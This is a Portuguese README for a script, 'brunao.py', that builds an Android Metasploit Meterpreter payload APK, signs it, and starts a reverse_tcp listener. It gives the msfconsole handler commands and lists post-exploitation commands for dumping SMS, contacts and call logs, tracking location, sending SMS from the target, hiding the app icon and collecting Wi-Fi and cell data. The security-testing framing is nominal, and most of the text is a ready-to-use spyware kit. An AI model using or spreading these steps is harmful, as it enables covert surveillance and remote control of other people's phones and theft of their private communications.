# Script brunao.py

Este script foi desenvolvido para automatizar várias etapas de testes e manipulações no Metasploit Framework e no Android. Ele realiza as seguintes tarefas:

- Atualiza o Metasploit Framework
- Gera um payload para Android
- Descompila e recompila o APK gerado
- Atualiza a versão do APK para Android 13
- Assina e otimiza o APK
- Inicia o listener do Meterpreter para conexões

## Funcionalidades

### 1. Atualização do Metasploit Framework
O script começa atualizando o Metasploit Framework e seu Linux todo para garantir que você esteja usando a versão mais recente. Durante a execução, ele verifica a versão instalada e a atualiza automaticamente se necessário.

### 2. Geração do Payload Android
O script gera um payload para Android e o salva como um arquivo APK, pronto para ser utilizado em testes de segurança.

### 3. Descompilação do APK
O APK gerado é descompilado usando a ferramenta Apktool, permitindo que o conteúdo seja acessado e modificado.

### 4. Atualização para Android 13
Após a descompilação, o script atualiza a versão do APK para Android 13, garantindo que o arquivo gerado seja compatível com a versão mais recente do sistema operacional.

### 5. Recompilação e Assinatura do APK
O APK modificado é recompilado e assinado digitalmente usando um keystore, o que permite sua execução em dispositivos Android.

### 6. Início do Listener do Meterpreter
Por fim, o script inicia o listener do Meterpreter, configurando a porta de escuta e esperando a conexão do dispositivo.

## Requisitos

- **Python 3**: O script foi desenvolvido para Python 3.
- **Metasploit Framework**: O Metasploit Framework deve estar instalado no sistema para a execução do script.
- **Apktool**: Usado para descompilar e recompilar o APK.
- **Keystore**: Necessário para assinar o APK gerado.

## Como Usar

1. Clone este repositório ou baixe o arquivo `brunao.py`.
2. Certifique-se de que o Metasploit Framework, Apktool e o Python 3 estão corretamente instalados no seu sistema.
3. Execute o script com o seguinte comando:

    ```bash
    sudo python3 brunao.py -r
    ```

4. Durante a execução, o script pedirá algumas informações, como a porta de destino para o listener (LPORT).
5. Após a execução bem-sucedida, você terá o APK assinado e otimizado pronto para ser utilizado.

## Exemplos de Uso

- **Iniciar o script**:

    ```bash
    sudo python3 brunao.py -r
    ```
  <h3>Quando tudo tiver compilado vai pedir uma senha a senha é: password</h3>
  <h4>Se errar a senha tente de novo usando o ' sudo python3 brunao.py -r ' e tente copia a senha: <h2>password</h2></h4>

    O script vai iniciar o processo automaticamente e pedirá que você forneça as informações necessárias, como a porta (LPORT).

## Contribuições

## Sinta-se à vontade para contribuir com melhorias ou correções. Caso encontre problemas, por favor, abra uma issue no repositório.

<br>
----------------------------------------------//-------------------------------//-------------------------------------

## Comandos específicos para Android

-activity_start: Inicia uma atividade Android a partir de uma string Uri.

-check_root: Verifica se o dispositivo Android é root.

-dump_calllog: Obtém o histórico de chamadas.

-dump_contacts: Obtém a lista de contatos.

-dump_sms: Obtém as mensagens SMS.

-geolocate: Obtém a localização atual usando geolocalização.

-hide_app_icon: Oculta o ícone do aplicativo do lançador.

-interval_collect: Gerencia a coleta de dados em intervalos.

-send_sms: Envia SMS do dispositivo alvo.

-sqlite_query: Consulta um banco de dados SQLite no armazenamento.

-wakelock: Habilita ou desabilita o Wakelock.

-wlan_geolocate: Obtém a localização usando informações de WLAN.


## Iniciar coleta de Wi-Fi:


Copiar código
interval_collect -a start -c wifi
Pausar a coleta de localização geográfica:


Copiar código
interval_collect -a pause -c geo
Exibir os dados coletados de torres de celular:


Copiar código
interval_collect -a dump -c cell


## (depois que instala o apk use sempre esse) Se você quiser iniciar o listener manualmente, execute o seguinte comando no terminal:


        msfconsole


## E, após carregar o Metasploit, configure o listener com o comando:


        use exploit/multi/handler
        set payload android/meterpreter/reverse_tcp
        set LHOST [IP_LOCAL]
        set LPORT [PORTA]
        exploit

        
Troque [IP_LOCAL] pelo seu IP local e [PORTA] pela porta que você configurou (como a porta 4444).

## se querer gerar um novo o apk(payload) apague os arquivos já existente como as pastas e apk's gerado

use: 
               sudo rm -rf Brunao_kyti
               
               sudo rm -rf brunao_kyti
               
               sudo rm -rf brunao_kyti.apk

               sudo rm -rf brunao_kyti_final.apk
               
               sudo rm -rf brunao_kyti_signed.apk


## depois de gerar o apk instaler o brunao_kyti_final.apk, guarde e use o msfconsole. 

